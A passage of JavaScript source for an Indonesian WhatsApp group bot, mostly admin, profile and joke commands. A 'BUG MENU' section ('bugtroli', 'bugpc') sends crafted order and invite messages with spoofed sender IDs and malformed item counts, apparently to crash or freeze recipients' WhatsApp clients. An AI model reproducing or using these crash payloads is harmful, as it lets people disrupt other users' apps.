if (sen.message.extendedTextMessage === undefined || sen.message.extendedTextMessage === null) return
mentioned = sen.message.extendedTextMessage.contextInfo.mentionedJid
mentions(`Berhasil Demote @${mentioned[0].split('@')[0]} Menjadi Member Group!`, mentioned, true)
dimas.groupDemoteAdmin(from, mentioned)
break */
      case 'promote':
             if (dim.message.extendedTextMessage === null || dim.message.extendedTextMessage === undefined) return;
             if (dim.message.extendedTextMessage.contextInfo.participant === undefined) {
             entah = dim.message.extendedTextMessage.contextInfo.mentionedJid
             if (entah.length > 0) {
             var mems_ids = []
             for (let ids of entah) {
             mems_ids.push(ids)
}
             dimas.groupMakeAdmin(from, mems_ids)
             } else {
             dimas.groupMakeAdmin(from, entah)
}
             } else {
             entah = dim.message.extendedTextMessage.contextInfo.participant
             dimas.groupMakeAdmin(from, [entah])
}
             break
      case 'demote':
             if (dim.message.extendedTextMessage === null || dim.message.extendedTextMessage === undefined) return;
             if (dim.message.extendedTextMessage.contextInfo.participant === undefined) {
             entah = dim.message.extendedTextMessage.contextInfo.mentionedJid
             if (entah.length > 0) {
             var mems_ids = []
             for (let ids of entah) {
             mems_ids.push(ids)
}
             dimas.groupDemoteAdmin(from, mems_ids)
             } else {
             dimas.groupDemoteAdmin(from, [entah[0]])
}
             } else {
             entah = dim.message.extendedTextMessage.contextInfo.participant
             dimas.groupDemoteAdmin(from, [entah])
}
             break
       case 'setgrupname':
                              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
                                          if (!isGroupAdmins) return reply(mess.only.admin)
            if (!isBotGroupAdmins) return 
              if (args.length == 0) return reply(`Penggunaan ${prefix}setgrupname name`)
              dimas.groupUpdateSubject(from, q)
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)))
              break
       case 'setdesc':
                              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
          if (!isGroupAdmins) return reply(mess.only.admin)

              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              if (args.length == 0)  return reply(`Penggunaan ${prefix}setdesc desc`)
              dimas.groupUpdateDescription(from, q)
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)))
              break
       case 'setppgrup':
                              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
          if (!isGroupAdmins) return reply(mess.only.admin)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              if (isQuotedImage) {
              let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(dim).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : dim
              let media = await dimas.downloadMediaMessage(encmedia)
              dimas.updateProfilePicture(from, media)
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)))
              } else {
              reply(`Tag gambar dengan caption ${prefix}setppgrup`)
}
              break
       case 'me':
       case 'profile':
              let Levelnye = level.getLevelingLevel(sender, _level)
              let Xpluu = level.getLevelingXp(sender, _level)
              let requiredXplu = 10 * Math.pow(Levelnye, 2) + 50 * Levelnye + 100
              dimas.updatePresence(from, Presence.composing)
              try {
              profil = await dimas.getProfilePicture(`${sender.split('@')[0]}@s.whatsapp.net`)
              } catch {
              profil = errorImg
}
              thu = await dimas.getStatus(`${sender.split('@')[0]}@s.whatsapp.net`, MessageType.text)
              me = dimas.user
              uptime = process.uptime()
              profile = `-----[ *USER INFO* ]-----\n\n➸ *Username:* ${pushname}\n➸ *Status:* ${thu.status}\n➸ *Premium*: ${isPremium ? 'Ya' : 'No'}\n➸ *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}\n➸ *Prefix :* Multi Prefix\n\n=_=_=_=_=_=_=_=_=_=_=_=_=\n\nYour progress:\n➸ *Level*: ${Levelnye}\n➸ *XP*: ${Xpluu} / ${requiredXplu}`
              buff = await getBuffer(profil)
              dimas.sendMessage(from, buff, image, {quoted: freply, caption: profile})
              break
       case 'afk': 
                              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
              if (isAfkOn) return reply('Woe Kalo Mau Afk Jangan Nimbrung di sini')
              const reason = q ? q : 'Nothing.'
              afk.addAfkUser(sender, time, reason, _afk)
              const aluty = `Fitur AFK berhasil *diaktifkan!*\n\n➸ *Ussername*: ${pushname}\n➸ *Alasan*: ${reason}`
              reply(aluty)
              break
       case 'infogrup':
       case 'infogrouup':
       case 'grupinfo':
       case 'groupinfo':
                              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

              try {
              var pic = await dimas.getProfilePicture(from)
              } catch {
              var pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
              let ingfo = `*G R O U P I N F O*\n\n*Name :* ${groupName}\n*ID Grup :* ${from}\n*Dibuat :* ${moment(`${groupMetadata.creation}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss')}\n*Owner Grup :* @${groupMetadata.owner.split('@')[0]}\n*Jumlah Admin :* ${groupAdmins.length}\n*Jumlah Peserta :* ${groupMembers.length}\n*Welcome :* ${isWelkom ? 'Aktif' : 'Mati'}\n*AntiLink :* ${isAntiLink ? 'Aktif' : 'Mati'}\n*Desc :* \n${groupMetadata.desc}`
              dimas.sendMessage(from, await getBuffer(pic), image, {quoted: dim, caption: ingfo, contextInfo: {"mentionedJid": [groupMetadata.owner.replace('@c.us', '@s.whatsapp.net')]}})
              break
       case 'tagall':
                 if (!isGroupAdmins) return reply(mess.only.admin)
                              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

              let arr = [];
              let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
              for (let i of groupMembers){
              txti += `=> @${i.jid.split("@")[0]}\n`
              arr.push(i.jid)
}
              mentions(txti, arr, true)
              break
              case 'linkgc':
              case 'linkgroup':
                if (!isGroupAdmins) return reply(mess.only.admin)
                   if (!isBotGroupAdmins) return reply(mess.only.Badmin)
                              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})
                linkgc = await dimas.groupInviteCode (from)
                yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
                dimas.sendMessage(from, yeh, text, {quoted: freply})
               // await limitAdd(sender)
                break
       case 'kickall': // Anti Banned
       if (!isOwner) return reply('HAYO NGAPAIN!!')
              for (let i of groupMembers) {
              await kickMember(from, [i.jid])
}
              break
       case 'leave':
       if (!isOwner) return 
                              if (!isGroup) return sendButMessage(from, grupaja, yok, torup, {quoted:freply})

              setTimeout( () => {
              dimas.groupLeave(from) 
              }, 2000)
              setTimeout( () => {
              reply('Byee...')
              }, 0)
              break
       case 'online':
       case 'listonline':
       case 'here':                
             if (!isGroup) return reply(`Only group`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(dimas.chats.get(ido).presences), dimas.user.jid]
             dimas.sendMessage(from, 'List Online:\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: dim, contextInfo: { mentionedJid: online }})
             } catch (e) {
             reply(`${e}`)
}
             break
      case 'hidetag':
      case 'h':
                if (!isGroupAdmins && !dim.key.fromMe &&  !isOwner) return reply(mess.only.admin)
                 //  if (!isBotGroupAdmins) return reply(mess.only.Badmin)
             try {
             quotedText = dim.message.extendedTextMessage.contextInfo.quotedMessage.conversation
             hideTag(from, `${quotedText}`)
             } catch {
             hideTag(from, `${q}`)
}
             break
      case 'sider':
                if (!isGroupAdmins) return reply(mess.only.admin)
             if(!isGroup) return sendButMessage(from, `Maaf hanya bisa di gunakan di group`, `Silahkan klik "LINK GROUP" jika ingin gabung`, [
          {
            buttonId: `${prefix}dimasgroup`,
            buttonText: {
              displayText: `JOIN GROUP`,
            },
            type: 1,
              }])
             try {
             infom = await dimas.messageInfo(from, dim.message.extendedTextMessage.contextInfo.stanzaId)
             tagg = []
             teks = `*• Dibaca oleh:*\n\n`
             for(let i of infom.reads){
             teks += '@' + i.jid.split('@')[0] + '\n'
             teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
             tagg.push(i.jid)
}
             teks += `*• Tersampaikan pada:*\n\n`
             for(let i of infom.deliveries){
             teks += '@' + i.jid.split('@')[0] + '\n'
             teks += `> ` + moment(`${i.t}` * 1000).tz('Asia/Jakarta').format('DD/MM/YYYY HH:mm:ss') + '\n\n'
             tagg.push(i.jid)
}
             mentions(teks, tagg, true)
             } catch (e) {
             console.log(color(e))
             reply('Reply chat bot!')
}
             break
             //B U G  M E N U
             case 'bugtroli':
             case 'bt':
              if (!isOwner && !dim.key.fromMe) return reply(mess.only.owner)
     function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
dimas.sendMessage(from, `▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒▒▒▒▒▒▒▒▄▄▄▄▄▄▄▄▒▒▒▒▒▒
▒▒█▒▒▒▄██████████▄▒▒▒▒
▒█▐▒▒▒████████████▒▒▒▒
▒▌▐▒▒██▄▀██████▀▄██▒▒▒
▐┼▐▒▒██▄▄▄▄██▄▄▄▄██▒▒▒
▐┼▐▒▒██████████████▒▒▒
▐▄▐████─▀▐▐▀█─█─▌▐██▄▒
▒▒█████──────────▐███▌
▒▒█▀▀██▄█─▄───▐─▄███▀▒
▒▒█▒▒███████▄██████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒██████████████▒▒▒
▒▒▒▒▒█████████▐▌██▌▒▒▒
▒▒▒▒▒▐▀▐▒▌▀█▀▒▐▒█▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▐▒▒▒▒▌▒▒▒▒▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒`, MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: ofrply,
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️Asylum☠️',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
dimas.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}} 
async function attack(targett){
bug(targett)
await sleep(100)
troli(targett)
await sleep(100)
bug(targett)
}

attack(dim.key.remoteJid)
break
case 'bugpc':
              if (!isOwner && !dim.key.fromMe) return reply(mess.only.owner)
                
  dimas.sendMessage(from, { "groupName": `ngazap(prefix)`, "groupJid": "6285709664923-1627579259@g.us", "inviteCode": "9JQb+8+4H7C63cCm", "inviteExpiration": "0", "caption": "virtex9", "jpegThumbnail": fs.readFileSync("./media/kiki.jpg") }, MessageType.groupInviteMessage,{ 
                 quoted: {
                key: {
                participant: '0@s.whatsapp.net', ...(from ? { remoteJid: "status@broadcast" } : {})
                },
                message: {
                orderMessage: {
                itemCount: 99999999,
                status: 1
                ,surface: 10,
                orderTitle: 'BUKAN BUG',
                sellerJid: '0@s.whatsapp.net'
                }}}})
  break
  
//------------------< Fun >-------------------
case 'quotemaker':
reply(mess.wait)
                    buff = await getBuffer(`https://leyscoders-api.herokuapp.com/api/quote-maker?text=${q}&apikey=IkyOgiwara`)
                    dimas.sendMessage(from, buff, image, {thumbnail: Buffer.alloc(0), quoted: freply})
       case 'wangy':
              if (!q) return
              qq = q.toUpperCase()
              awikwok = `${qq} ${qq} ${qq} ❤️ ❤️ ❤️ WANGY WANGY WANGY WANGY HU HA HU HA HU HA, aaaah baunya rambut ${qq} wangyy aku mau nyiumin aroma wangynya ${qq} AAAAAAAAH ~ Rambutnya.... aaah rambutnya juga pengen aku elus-elus ~~ AAAAAH ${qq} keluar pertama kali di anime juga manis ❤️ ❤️ ❤️ banget AAAAAAAAH ${qq} AAAAA LUCCUUUUUUUUUUUUUUU............ ${qq} AAAAAAAAAAAAAAAAAAAAGH ❤️ ❤️ ❤️apa ? ${qq} itu gak nyata ? Cuma HALU katamu ? nggak, ngak ngak ngak ngak NGAAAAAAAAK GUA GAK PERCAYA ITU DIA NYATA NGAAAAAAAAAAAAAAAAAK PEDULI BANGSAAAAAT !! GUA GAK PEDULI SAMA KENYATAAN POKOKNYA GAK PEDULI. ❤️ ❤️ ❤️ ${qq} gw ... ${qq} di laptop ngeliatin gw, ${qq} .. kamu percaya sama aku ? aaaaaaaaaaah syukur ${q} aku gak mau merelakan ${qq} aaaaaah ❤️ ❤️ ❤️ YEAAAAAAAAAAAH GUA MASIH PUNYA ${qq} SENDIRI PUN NGGAK SAMA AAAAAAAAAAAAAAH`
              reply(awikwok)
              break
       case 'mining':
              var mining = randomNomor(1000)
              atm.addKoinUser(sender, mining, _uang)
              await reply(`*Selamat Kamu Mendapatkan*: _Rp ${mining} 💰_`)
              break
       case 'waktu':
              reply(`Waktu Indonesia Barat: *${moment().utcOffset('+0700').format('HH:mm')}* WIB \nWaktu Indonesia Tengah: *${moment().utcOffset('+0800').format('HH:mm')}* WITA \nWaktu Indonesia Timur: *${moment().utcOffset('+0900').format('HH:mm')}* WIT`)
              break
       case 'cekmati':
              if (!q) return reply(mess.wrongFormat)
              predea = await axios.get(`https://api.agify.io/?name=${q}`)
              reply(`Nama : ${predea.data.name}\n*Mati Pada Umur :* ${predea.data.age} Tahun.\n\n_Cepet Cepet Tobat Bro Soalnya Mati ga ada yang tau_`)
              break
       case 'togel':
              reply(mess.wait)
              try {
              dataplai = await axios.get(`https://api.vhtear.com/togel&apikey=${setting.vhtearkey}`)
              dataplay = dataplai.data.result
              let tomgel = `*Huzzzzz*\n`
              for (let i = 0; i < dataplay.hasil.length; i++) {
              tomgel += `\n═════════════════\n\n*Negara* : ${dataplay.hasil[i].Negara}\n*Result* : ${dataplay.hasil[i].Senin}\n*Result* : ${dataplay.hasil[i].Selasa}\n*Result* : ${dataplay.hasil[i].Rabu}\n*Result* : ${dataplay.hasil[i].Kamis}\n*Result* : ${dataplay.hasil[i].Jumat}\n*Result* : ${dataplay.hasil[i].Sabtu}\n*Result* : ${dataplay.hasil[i].Minggu}\n`
}
              sendText(from, tomgel)
              } catch (err) {
              console.log(err)
}
              break
       case 'toxic':
              Toxic().then(toxic => {
              reply (toxic)
})
              break
        case 'citacita':
              const cita =['http://piyobot.000webhostapp.com/citacita1.mp3','http://piyobot.000webhostapp.com/citacita2.mp3','http://piyobot.000webhostapp.com/citacita3.mp3','http://piyobot.000webhostapp.com/citacita4.mp3','http://piyobot.000webhostapp.com/citacita5.mp3','http://piyobot.000webhostapp.com/citacita6.mp3','http://piyobot.000webhostapp.com/citacita7.mp3','http://piyobot.000webhostapp.com/citacita8.mp3','http://piyobot.000webhostapp.com/citacita9.mp3','http://piyobot.000webhostapp.com/citacita10.mp3','http://piyobot.000webhostapp.com/citacita11.mp3','http://piyobot.000webhostapp.com/citacita12.mp3','http://piyobot.000webhostapp.com/citacita13.mp3','http://piyobot.000webhostapp.com/citacita14.mp3','http://piyobot.000webhostapp.com/citacita15.mp3','http://piyobot.000webhostapp.com/citacita16.mp3','http://piyobot.000webhostapp.com/citacita17.mp3','http://piyobot.000webhostapp.com/citacita18.mp3','http://piyobot.000webhostapp.com/citacita19.mp3','http://piyobot.000webhostapp.com/citacita20.mp3','http://piyobot.000webhostapp.com/citacita21.mp3','http://piyobot.000webhostapp.com/citacita22.mp3','http://piyobot.000webhostapp.com/citacita23.mp3','http://piyobot.000webhostapp.com/citacita24.mp3','http://piyobot.000webhostapp.com/citacita25.mp3','http://piyobot.000webhostapp.com/citacita26.mp3','http://piyobot.000webhostapp.com/citacita27.mp3','http://piyobot.000webhostapp.com/citacita28.mp3','http://piyobot.000webhostapp.com/citacita29.mp3','http://piyobot.000webhostapp.com/citacita30.mp3','http://piyobot.000webhostapp.com/citacita31.mp3','http://piyobot.000webhostapp.com/citacita32.mp3','http://piyobot.000webhostapp.com/citacita33.mp3','http://piyobot.000webhostapp.com/citacita34.mp3','http://piyobot.000webhostapp.com/citacita35.mp3']
              const cita3 = cita[Math.floor(Math.random() * cita.length)]
              cita2 = await getBuffer(cita3)
              dimas.sendMessage(from, cita2, audio,{mimetype: 'audio/mp4', ptt:true, quoted: freply})
              break
       case 'apakah':
              apakah = body.slice(1)
              const apa =['Iya','Tidak','Bisa Jadi','Coba Ulangi']
              const kah = apa[Math.floor(Math.random() * apa.length)]
              dimas.sendMessage(from, '*Pertanyaan :* '+apakah+'\n*Jawaban :* '+ kah, text, { quoted: dim })
              break
       case 'rate':
       case 'nilai':
              rate = body.slice(1)
              const ra =['0','4','9','17','28','34','48','59','62','74','83','97','100','29','94','75','82','41','39']
              const te = ra[Math.floor(Math.random() * ra.length)]
              dimas.sendMessage(from, '*Pertanyaan :* '+rate+'\n*Jawaban :* '+ te+'%', text, { quoted: dim })
              break
      case 'bay':
      reply('Sayonara buat yang pergi😔\n Semoga amal ibadahnya di terima :)')
      break
      case 'selamatdatang':
      reply('welcome kak jangan lupa patuhi peraturan  grup ya kaka \n Semoga betah👏')
      break
       case 'gantengcek':
       case 'cekganteng':
              ganteng = body.slice(1)
              const gan =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const teng = gan[Math.floor(Math.random() * gan.length)]
              dimas.sendMessage(from, '*Pertanyaan :* '+ganteng+'\n*Jawaban :* '+ teng+'%', text, { quoted: dim })
              break
       case 'cantikcek':
       case 'cekcantik':
              cantik = body.slice(1)
              const can =['10','30','20','40','50','60','70','62','74','83','97','100','29','94','75','82','41','39']
              const tik = can[Math.floor(Math.random() * can.length)]
              dimas.sendMessage(from, '*Pertanyaan :* '+cantik+'\n*Jawaban :* '+ tik+'%', text, { quoted: dim })
              break
       case 'cekwatak':
              var namao = pushname
              var prfx = await dimas.getProfilePicture(sender)
              const watak = ['top deh pokoknya','penyayang','pemurah','Pemarah','Pemaaf','Penurut','Baik','baperan','Baik-Hati','penyabar','UwU','Suka Membantu']
              const wtk = watak[Math.floor(Math.random() * (watak.length))]
              const ratenyaasu = ['100%','95%','90%','85%','80%','75%','70%','65%','60%','55%','50%','45%','40%','35%','30%','25%','20%','15%','10%','5%']
              const akhlak = ratenyaasu[Math.floor(Math.random() * (ratenyaasu.length))]
              const sifat = ['Penolong','Suka Membantu','Saling Menolong','Perhatian','Ngak Cuek','Romantis','Dermawan','Cool','Peduli Kepada Sesama','Suka Berkata Kasar']
              const sft = sifat[Math.floor(Math.random() * (sifat.length))]
              const hobby = ['Memasak','Membantu Atok','Mabar','Nobar','Coli','Coldim','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
              const hby = hobby[Math.floor(Math.random() * (hobby.length))]
              const kelebihan = ['Soleh dan Soleha','Pintar','Rajin','Teladan']
              const klbh = kelebihan[Math.floor(Math.random() * (kelebihan.length))]
              const tipe = ['cool','idaman','Alami','Keren','Ideal','Dia Bamget','normal','elite','epic','Legend']
              const typo = tipe[Math.floor(Math.random() * (tipe.length))]
              await reply(`[ INTROGASI SUKSES ]\n\n[Nama]:${namao}\n\n[Watak]:${wtk}\n\n[Akhlak✨]:${akhlak}\n\n[Sifat]:${sft}\n\n[Hobby]:${hby}\n\n[Tipe]:${typo}\n\n[Kelebihan]:${klbh}\n\nNote\n\n_ini hanya main main_`)
              break
       case 'hobby':
              hobby = body.slice(1)
              const by = hobby[Math.floor(Math.random() * hobby.length)]
              dimas.sendMessage(from, 'Pertanyaan : *'+hobby+'*\n\nJawaban : '+ by, text, { quoted: dim })
              break
       case 'bisakah':
              bisakah = body.slice(1)
              const bisa =['Bisa','Tidak Bisa','Coba Ulangi','MANA GW TAU']
              const keh = bisa[Math.floor(Math.random() * bisa.length)]
              dimas.sendMessage(from, '*Pertanyaan :* '+bisakah+'\n*Jawaban :* '+ keh, text, { quoted: dim })
              break
       case 'kapankah':
              kapankah = body.slice(1)
              const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi']
              const koh = kapan[Math.floor(Math.random() * kapan.length)]
              dimas.sendMessage(from, '*Pertanyaan :* '+kapankah+'\n*Jawaban :* '+ koh, text, { quoted: dim })
              break
       case 'truth':
              const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
              const ttrth = trut[Math.floor(Math.random() * trut.length)]
              truteh = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              dimas.sendMessage(from, truteh, image, { caption: '*Truth*\n\n'+ ttrth, quoted: dim })
              break
       case 'dare':
              const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "??💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
              const der = dare[Math.floor(Math.random() * dare.length)]
              buff = await getBuffer(`https://i.ibb.co/305yt26/bf84f20635dedd5dde31e7e5b6983ae9.jpg`)
              buttons = [{buttonId: `${prefix + command}`,buttonText:{displayText: `➡️Next`},type:1}]
              imageMsg = (await dimas.prepareMessageMedia(buff, "imageMessage", { thumbnail: buff, })).imageMessage
              buttonsMessage = {footerText:'Jangan Lupa Donasi Ya Kak ☕', imageMessage: imageMsg,
              contentText:'*Dare*\n\n'+ der,buttons,headerType:4}
              prep = await dimas.prepareMessageFromContent(from,{buttonsMessage},{quoted: freply})
              dimas.relayWAMessage(prep)
               break		
       case 'jadian':
              jds = []
              jdii = groupMembers
              koss = groupMembers
              akuu = jdii[Math.floor(Math.random() * jdii.length)]
              diaa = koss[Math.floor(Math.random() * koss.length)]
              teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
              jds.push(akuu.jid)
              jds.push(diaa.jid)
              mentions(teks, jds, true)
              break
       case 'cantik':
              membr = []
              const mes = groupMembers
              const msk = groupMembers
              const siaps = mes[Math.floor(Math.random() * mes.length)]
              const sips = pushname[Math.floor(Math.random() * msk.length)]
              teks = `*Yang Paling Cantik Disini Adalah :* @${siaps.jid.split('@')[0]}`
              membr.push(siaps.jid)
              mentions(teks, membr, true)
              break
       case 'ganteng':
              membr = []
              const nus = groupMembers
              const msl = groupMembers
              const siapss = nus[Math.floor(Math.random() * nus.length)]
              const sipss = pushname[Math.floor(Math.random() * msl.length)]
              teks = `*Masih Gantengan Owner Gua :* @${siapss.jid.split('@')[0]}`
              membr.push(siapss.jid)
              mentions(teks, membr, true)
              break
       case 'babi':
              membr = []
              const meg = groupMembers
              const mge = groupMembers
              const ba = meg[Math.floor(Math.random() * meg.length)]
              const bi = pushname[Math.floor(Math.random() * mge.length)]
              teks = `*Yang Paling Babi Disini Adalah :* @${ba.jid.split('@')[0]}`
              membr.push(ba.jid)
              mentions(teks, membr, true)
              break
       case 'beban':
              membr = []
              const nge = groupMembers
              const tod = groupMembers
              const beb = nge[Math.floor(Math.random() * nge.length)]
              const an = pushname[Math.floor(Math.random() * tod.length)]
              teks = `*Yang Paling Beban Disini Adalah :* @${beb.jid.split('@')[0]}`
              membr.push(beb.jid)
              mentions(teks, membr, true)
              break
//------------------< Lainnya >-------------------
        case 'getpp':
               if (dim.message.extendedTextMessage === null || dim.message.extendedTextMessage === undefined) {
               linkpp = await dimas.getProfilePicture(from) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
               buffer = await getBuffer(linkpp)
               dimas.sendMessage(from, buffer, image, {caption: "Nih", quoted: dim })
               } else if (dim.message.extendedTextMessage.contextInfo.mentionedJid === null || dim.message.extendedTextMessage.contextInfo.mentionedJid === undefined) {
               mberr = dim.message.extendedTextMessage.contextInfo.participant
               linkpp = await dimas.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
               buffer = await getBuffer(linkpp)
               dimas.sendMessage(from, buffer, image, { quoted: dim, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
               } else if (dim.message.extendedTextMessage.contextInfo.mentionedJid.length > 0) {
               mberr = dim.message.extendedTextMessage.contextInfo.mentionedJid[0]
               linkpp = await dimas.getProfilePicture(mberr) || "https://telegra.ph/file/40151a65238ba2643152d.jpg"
               buffer = await getBuffer(linkpp)
               dimas.sendMessage(from, buffer, image, { quoted: dim, caption: `Profile Picture of @${mberr.split("@")[0]}`, contextInfo: { "mentionedJid": [mberr] }})
}
               break
        case 'd':
        case 'del':
        case 'delete': // MR.CYSER
                      if (!isBotGroupAdmins) return reply(`Bot Harus jadi Admin`)
               try {
               if (dim.message.extendedTextMessage === undefined || dim.message.extendedTextMessage === null) return reply('Reply chat bot')
               dimas.deleteMessage(from, {id: dim.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true})
               } catch (e){
               reply('Reply chat bot')
}
               break
        case 'tes':
              // reply('Okeh nyala')
               tex = '[ *_OKEH NYALA_* ]'
               foter = `\`\`\`▢ Speed : ${latensie.toFixed(4)} _Second_\`\`\`
\`\`\`▢ Active Time : ${kyun(uptime)}\`\`\``
bton = [
          {
            buttonId: `${prefix}menu`,
            buttonText: {
              displayText: `MENU`,
            },
            type: 1,
              }] 
              return sendButMessage(from, tex, foter, bton, {quoted:freply})
               break
        case 'info':  // Jangan Di Ubah Plise
               urlinfo = 'https://telegra.ph/file/5a8d6bf0339cc120bfb6c.jpg'
               thankslort = `┌──「 *INFORMATION* 」
│
├ *BOT TYPE* : NodeJS
├ *NAME*  : dimas
├ *VERSION* : 1.0
├ *GITHUB* : 
│
├─「 *𝙏𝙃𝘼𝙉𝙆𝙎 𝙏𝙊* 」
│
├ ALLAH SWT
├ Nino Chan
├ Xinz Bot
├ Manurius
├ Arif
├ Fathur
├ Kwn² Yg Bantu Gw
├ And all creator bot
│
└──「 *${botName}* 」`
             dimas.sendMessage(from, await getBuffer(urlinfo), image, {quoted: dim, caption: thankslort })
             break
case 'media':
if (isBan) return reply(mess.ban)
if (!q) return reply('Urlnya?')
reply(mess.wait)
sendMediaURL(from, `${args[0]}`, "").catch(() => reply('Error'))
break
      case 'get':
      case 'fetch': //ambil dari nuru
             if (!/^https?:\/\//.test(q)) return reply('Awali *URL* dengan http:// atau https://')
             res = await fetch(q)
             if (res.headers.get('content-length') > 100 * 1024 * 1024 * 1024) {
             delete res
             throw `Content-Length: ${res.headers.get('content-length')}`
}
             if (!/text|json/.test(res.headers.get('content-type'))) return sendMediaURL(from, q)
             txtx = await res.buffer()
             try {
             txtx = util.format(JSON.parse(txtx+''))
             } catch (e) {
             txtx = txtx + ''
             } finally {
             reply(txtx.slice(0, 65536) + '')
}
             break
      case 'searchmsg': 
case 'caripesan':  //by ANU TEAM
             if (args.length < 1) return reply(`Pesan Yang Mau Dicari Apaan?\nContoh : ${prefix + command} halo|10`)
             teks = arg
             if (teks.includes("|")) { 
             try {
             var ve = teks.split("|")[0]
             var za = teks.split("|")[1]
             sampai = `${za}`
             if (isNaN(sampai)) return reply('Harus berupa Angka!')
             batas = parseInt(sampai) + 1
             if (batas > 30) return reply('Maks 30!')
             reply(mess.wait)
             cok = await dimas.searchMessages(`${ve}`, from, batas,1) 
